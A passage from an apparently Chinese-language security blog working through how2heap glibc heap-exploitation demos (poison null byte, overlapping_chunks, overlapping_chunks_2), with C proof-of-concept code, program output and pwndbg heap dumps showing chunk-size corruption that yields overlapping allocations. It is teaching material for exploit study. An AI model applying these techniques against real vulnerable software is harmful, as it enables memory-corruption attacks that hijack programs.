&apos;b2&apos;).\n&quot;);</span><br><span class="line"></span><br><span class="line">	free(b1);</span><br><span class="line">	free(c);</span><br><span class="line">	</span><br><span class="line">	fprintf(stderr, &quot;Finally, we allocate &apos;d&apos;, overlapping &apos;b2&apos;.\n&quot;);</span><br><span class="line">	d = malloc(0x300);</span><br><span class="line">	fprintf(stderr, &quot;d: %p\n&quot;,d);</span><br><span class="line">	</span><br><span class="line">	fprintf(stderr, &quot;Now &apos;d&apos; and &apos;b2&apos; overlap.\n&quot;);</span><br><span class="line">	memset(d,&apos;D&apos;,0x300);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;New b2 content:\n%s\n&quot;,b2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf &quot;</span><br><span class="line">		&quot;for the clear explanation of this technique.\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试失败， ubuntu14.04和ubuntu16.04。</p>
<p>参考glibc_2.26中的写法，在<code>free(b)</code>之前，添加<code>*(size_t*)(b + 0x1f0) = 0x200;</code>即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Welcome to poison null byte 2.0!</span><br><span class="line">Tested in Ubuntu 14.04 64bit.</span><br><span class="line">This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.</span><br><span class="line">We allocate 0x100 bytes for &apos;a&apos;.</span><br><span class="line">a: 0x603010</span><br><span class="line">Since we want to overflow &apos;a&apos;, we need to know the &apos;real&apos; size of &apos;a&apos; (it may be more than 0x100 because of rounding): 0x108</span><br><span class="line">b: 0x603120</span><br><span class="line">c: 0x603330</span><br><span class="line">We allocate a barrier at 0x603440, so that c is not consolidated with the top-chunk when freed.</span><br><span class="line">The barrier is not strictly necessary, but makes things less confusing</span><br><span class="line">b.size: 0x211</span><br><span class="line">b.size is: (0x200 + 0x10) | prev_in_use</span><br><span class="line">We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;</span><br><span class="line">b.size: 0x200</span><br><span class="line">c.prev_size is 0x210</span><br><span class="line">b1: 0x603120</span><br><span class="line">Now we malloc &apos;b1&apos;. It will be placed where &apos;b&apos; was. At this point c.prev_size should have been updated, but it was not: 0x210</span><br><span class="line">Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0</span><br><span class="line">We malloc &apos;b2&apos;, our &apos;victim&apos; chunk.</span><br><span class="line">b2: 0x603230</span><br><span class="line">Current b2 content:</span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">Now we free &apos;b1&apos; and &apos;c&apos;: this will consolidate the chunks &apos;b1&apos; and &apos;c&apos; (forgetting about &apos;b2&apos;).</span><br><span class="line">Finally, we allocate &apos;d&apos;, overlapping &apos;b2&apos;.</span><br><span class="line">d: 0x603120</span><br><span class="line">Now &apos;d&apos; and &apos;b2&apos; overlap.</span><br><span class="line">New b2 content:</span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.</span><br></pre></td></tr></table></figure>
<ul>
<li>定义变量，并初始化</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">uint8_t* a;</span><br><span class="line">uint8_t* b;</span><br><span class="line">uint8_t* c;</span><br><span class="line">uint8_t* b1;</span><br><span class="line">uint8_t* b2;</span><br><span class="line">uint8_t* d;</span><br><span class="line">void *barrier;</span><br><span class="line"></span><br><span class="line">a = (uint8_t*) malloc(0x100);</span><br><span class="line">b = (uint8_t*) malloc(0x200);</span><br><span class="line">c = (uint8_t*) malloc(0x100);</span><br><span class="line">barrier =  malloc(0x100);</span><br></pre></td></tr></table></figure>
<p>barrier用于保证free(c)的时候，c chunk不会因为consolidate和top chunk合并。</p>
<ul>
<li>针对b chunk做预处理，然后释放 b</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint64_t* b_size_ptr = (uint64_t*)(b - 8);</span><br><span class="line">	</span><br><span class="line">*(size_t*)(b + 0x1f0) = 0x200;</span><br><span class="line"></span><br><span class="line">free(b);</span><br></pre></td></tr></table></figure>
<ul>
<li>假设 a chunk存在 off_by_one</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br></pre></td></tr></table></figure>
<p>当前 b chunk的size为<code>0x210 | prev_in_use = 0x211</code>，经过off_by_one，b chunk的size将变为 0x200.所以在b chunk预处理的时候，需要将<code>*(size_t*)(b + 0x1f0) = 0x200;</code></p>
<ul>
<li>申请两个新的chunk, b1和b2，并初始化b2</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;</span><br><span class="line">b1 = malloc(0x100);</span><br><span class="line">b2 = malloc(0x80);</span><br><span class="line">memset(b2,&apos;B&apos;,0x80);</span><br></pre></td></tr></table></figure>
<p>此时b1和b2都是b chunk的一部分</p>
<ul>
<li>释放b1和b2</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(b1);</span><br><span class="line">free(c);</span><br></pre></td></tr></table></figure>
<p>先 free b1，这个时候 chunk c 会认为 b1 就是 chunk b。当我们 free chunk c 的时候，chunk c会和chunk b1合并。由于 chunk c 认为 chunk b1 依旧是 chunk b。因此会把中间的 chunk b2 吞并。</p>
<ul>
<li>再申请一个0x300大小的chunk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = malloc(0x300);</span><br></pre></td></tr></table></figure>
<p>这时候，b2 将指向d中的某一部分。</p>
<h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><p>通过伪造unsorted bin的size，实现overlapping</p>
<p>简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])&#123;</span><br><span class="line">	intptr_t *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	p1 = malloc(0x100 - 8);</span><br><span class="line">	p2 = malloc(0x100 - 8);</span><br><span class="line">	p3 = malloc(0x80 - 8);</span><br><span class="line"></span><br><span class="line">	memset(p1, &apos;1&apos;, 0x100 - 8);</span><br><span class="line">	memset(p2, &apos;2&apos;, 0x100 - 8);</span><br><span class="line">	memset(p3, &apos;3&apos;, 0x80 - 8);</span><br><span class="line"></span><br><span class="line">	free(p2);</span><br><span class="line"></span><br><span class="line">	int evil_chunk_size = 0x181;</span><br><span class="line">	int evil_region_size = 0x180 - 8;</span><br><span class="line"></span><br><span class="line">	*(p2-1) = evil_chunk_size; // we are overwriting the &quot;size&quot; field of chunk p2</span><br><span class="line">	p4 = malloc(evil_region_size);</span><br><span class="line"></span><br><span class="line">	memset(p4, &apos;4&apos;, evil_region_size);</span><br><span class="line">	fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);</span><br><span class="line">	fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nAnd if we then memset(p3, &apos;3&apos;, 80), we have:\n&quot;);</span><br><span class="line">	memset(p3, &apos;3&apos;, 80);</span><br><span class="line">	fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);</span><br><span class="line">	fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/how2heap/glibc_2.25$ ./overlapping_chunks</span><br><span class="line"></span><br><span class="line">This is a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line">Let&apos;s start to allocate 3 chunks on the heap</span><br><span class="line">The 3 chunks have been allocated here:</span><br><span class="line">p1=0x2586010</span><br><span class="line">p2=0x2586110</span><br><span class="line">p3=0x2586210</span><br><span class="line"></span><br><span class="line">Now let&apos;s free the chunk p2</span><br><span class="line">The chunk p2 is now in the unsorted bin ready to serve possible</span><br><span class="line">new malloc() of its size</span><br><span class="line">Now let&apos;s simulate an overflow that can overwrite the size of the</span><br><span class="line">chunk freed p2.</span><br><span class="line">For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.</span><br><span class="line">To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.</span><br><span class="line">We are going to set the size of chunk p2 to to 385, which gives us</span><br><span class="line">a region size of 376</span><br><span class="line"></span><br><span class="line">Now let&apos;s allocate another chunk with a size equal to the data</span><br><span class="line">size of the chunk p2 injected size</span><br><span class="line">This malloc will be served from the previously freed chunk that</span><br><span class="line">is parked in the unsorted bin which size has been modified by us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at 0x2586110 and ends at 0x2586288</span><br><span class="line">p3 starts at 0x2586210 and ends at 0x2586288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data on</span><br><span class="line">chunk p3, and data written to chunk p3 can overwrite data</span><br><span class="line">stored in the p4 chunk.</span><br><span class="line"></span><br><span class="line">Let&apos;s run through an example. Right now, we have:</span><br><span class="line">p4 = xř</span><br><span class="line">p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�</span><br><span class="line"></span><br><span class="line">If we memset(p4, &apos;4&apos;, 376), we have:</span><br><span class="line">p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�</span><br><span class="line">p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�</span><br><span class="line"></span><br><span class="line">And if we then memset(p3, &apos;3&apos;, 80), we have:</span><br><span class="line">p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�</span><br><span class="line">p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�</span><br></pre></td></tr></table></figure>
<p>分析:</p>
<ul>
<li>分配3个堆块,并初始化堆块的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p1 = malloc(0x100 - 8);</span><br><span class="line">p2 = malloc(0x100 - 8);</span><br><span class="line">p3 = malloc(0x80 - 8);</span><br><span class="line">memset(p1, &apos;1&apos;, 0x100 - 8);</span><br><span class="line">memset(p2, &apos;2&apos;, 0x100 - 8);</span><br><span class="line">memset(p3, &apos;3&apos;, 0x80 - 8);</span><br></pre></td></tr></table></figure>
<ul>
<li>释放第二个区块,<code>free(p2)</code>,且p2处于unsorted bins中</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x3131313131313131, </span><br><span class="line">  bk = 0x3131313131313131, </span><br><span class="line">  fd_nextsize = 0x3131313131313131, </span><br><span class="line">  bk_nextsize = 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 3544668469065756977, </span><br><span class="line">  size = 257,  //0x100</span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x3232323232323232, </span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603200 &#123;</span><br><span class="line">  prev_size = 256, </span><br><span class="line">  size = 128,    // 0x80</span><br><span class="line">  fd = 0x3333333333333333, </span><br><span class="line">  bk = 0x3333333333333333, </span><br><span class="line">  fd_nextsize = 0x3333333333333333, </span><br><span class="line">  bk_nextsize = 0x3333333333333333</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过某些方法，比如p1的溢出，修改释放后的p2的 size 为 0x180</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int evil_chunk_size = 0x181;</span><br><span class="line">int evil_region_size = 0x180 - 8;</span><br><span class="line">*(p2-1) = evil_chunk_size;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x603000 PREV_INUSE &#123;                                    // p1</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x3131313131313131, </span><br><span class="line">  bk = 0x3131313131313131, </span><br><span class="line">  fd_nextsize = 0x3131313131313131, </span><br><span class="line">  bk_nextsize = 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;                                      // p2</span><br><span class="line">  prev_size = 3544668469065756977, </span><br><span class="line">  size = 385, </span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x3232323232323232, </span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603280 PREV_INUSE &#123;                                          // top_chunk</span><br><span class="line">  prev_size = 3689348814741910323, </span><br><span class="line">  size = 134529, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请0x180大小的p4, <code>p4 = malloc(evil_region_size);</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">0x603000 PREV_INUSE &#123;                       </span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x3131313131313131, </span><br><span class="line">  bk = 0x3131313131313131, </span><br><span class="line">  fd_nextsize = 0x3131313131313131, </span><br><span class="line">  bk_nextsize = 0x3131313131313131</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 3544668469065756977, </span><br><span class="line">  size = 385, </span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x3232323232323232, </span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line">0x603280 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 3689348814741910323, </span><br><span class="line">  size = 134529, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时, </p>
<p>p4    ————&gt; 0x603100   ——- 0x603280, 大小0x180</p>
<p>p3    ————&gt; 0x603200   ——- 0x603280，大小0x80</p>
<h1 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h1><p>同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  </span><br><span class="line">  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  int prev_in_use = 0x1;</span><br><span class="line"></span><br><span class="line">  p1 = malloc(1000);</span><br><span class="line">  p2 = malloc(1000);</span><br><span class="line">  p3 = malloc(1000);</span><br><span class="line">  p4 = malloc(1000);</span><br><span class="line">  p5 = malloc(1000);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  memset(p1,&apos;A&apos;,real_size_p1);</span><br><span class="line">  memset(p2,&apos;B&apos;,real_size_p2);</span><br><span class="line">  memset(p3,&apos;C&apos;,real_size_p3);</span><br><span class="line">  memset(p4,&apos;D&apos;,real_size_p4);</span><br><span class="line">  memset(p5,&apos;E&apos;,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  free(p4);</span><br><span class="line"></span><br><span class="line">  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE </span><br><span class="line"></span><br><span class="line">  free(p2);</span><br><span class="line">  </span><br><span class="line">  fprintf(stderr, &quot;\nNow let&apos;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">  p6 = malloc(2000);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;%s\n&quot;,(char *)p3); </span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;\nLet&apos;s write something inside p6\n&quot;);</span><br><span class="line">  memset(p6,&apos;F&apos;,1500);  </span><br><span class="line">  </span><br><span class="line">  fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;%s\n&quot;,(char *)p3); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">This is a simple chunks overlapping problem</span><br><span class="line">This is also referenced as Nonadjacent Free Chunk Consolidation Attack</span><br><span class="line"></span><br><span class="line">Let&apos;s start to allocate 5 chunks on the heap:</span><br><span class="line"></span><br><span class="line">chunk p1 from 0x21c3010 to 0x21c33f8</span><br><span class="line">chunk p2 from 0x21c3400 to 0x21c37e8</span><br><span class="line">chunk p3 from 0x21c37f0 to 0x21c3bd8</span><br><span class="line">chunk p4 from 0x21c3be0 to 0x21c3fc8</span><br><span class="line">chunk p5 from 0x21c3fd0 to 0x21c43b8</span><br><span class="line"></span><br><span class="line">Let&apos;s free the chunk p4.</span><br><span class="line">In this case this isn&apos;t coealesced with top chunk since we have p5 bordering top chunk after p4</span><br><span class="line"></span><br><span class="line">Let&apos;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><br><span class="line">with the size of chunk_p2 + size of chunk_p3</span><br><span class="line"></span><br><span class="line">Now during the free() operation on p2, the allocator is fooled to think that </span><br><span class="line">the nextchunk is p4 ( since p2 + size_p2 now point to p4 ) </span><br><span class="line"></span><br><span class="line">This operation will basically create a big free chunk that wrongly includes p3</span><br><span class="line"></span><br><span class="line">Now let&apos;s allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><br><span class="line"></span><br><span class="line">Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and </span><br><span class="line">we can overwrite data in p3 by writing on chunk p6</span><br><span class="line"></span><br><span class="line">chunk p6 from 0x21c3400 to 0x21c3bd8</span><br><span class="line">chunk p3 from 0x21c37f0 to 0x21c3bd8</span><br><span class="line"></span><br><span class="line">Data 